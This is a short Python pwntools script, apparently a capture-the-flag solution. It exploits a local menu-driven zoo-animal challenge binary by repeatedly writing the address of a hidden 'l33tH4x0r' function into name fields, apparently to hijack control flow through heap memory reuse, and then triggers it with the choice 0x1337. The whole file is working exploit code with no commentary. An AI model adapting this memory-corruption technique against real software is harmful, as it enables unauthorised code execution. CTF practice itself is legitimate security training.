from pwn import *

f = '503b8ee65d7e768e81ee95b7ce14b2a903abb5c7'
e = ELF(f)

eip = p32(e.symbols['l33tH4x0r'])

p = process('./'+f)

p.recvuntil('choice:\n')
p.sendline('2')
p.recvuntil('Caspian Tiger\n')
p.sendline('3')
p.recvuntil('tiger:\n')
p.sendline(eip + '\x00'*4)

p.recvuntil('choice:\n')
p.sendline('3')
p.recvuntil('Brown Bear\n')
p.sendline('3')
p.recvuntil('name:\n')
p.sendline(eip + '\x00'*4)

p.recvuntil('choice:\n')
p.sendline('4')
p.recvuntil('?\n')
p.sendline('1')

p.recvuntil('choice:\n')
p.sendline('2')
p.recvuntil('Caspian Tiger\n')
p.sendline('3')
p.recvuntil('tiger:\n')
p.sendline(eip + '\x00'*4)

p.recvuntil('choice:\n')
p.sendline(str(0x1337))

print(p.recvline().strip())
